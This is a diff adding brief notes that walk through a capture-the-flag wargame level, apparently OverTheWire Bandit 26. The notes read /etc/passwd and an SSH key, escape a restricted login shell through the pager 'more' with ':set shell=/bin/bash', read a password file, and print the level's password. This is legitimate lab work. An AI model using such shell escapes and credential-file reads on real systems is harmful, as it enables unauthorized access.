@@ -1,0 +1,24 @@
+- ls
+- cat bandit26.sshkey
+- cat /etc/passwd
+
+User bandit26 has shell set to /usr/bin/showtext
+
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+
+The test.txt file can be displayed immediately as the file is very short, hence more does not it to go
+in command/interactive mode. However, if we make the terminal window smaller and then press 'V', more will
+now be in command mode. From there we can set the shell and get the users password.
+
+## Override user shell to bash in command mode
+
+:set shell=/bin/bash
+
+cat /etc/bandit_pass/bandit26
+
+level26 password -> s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
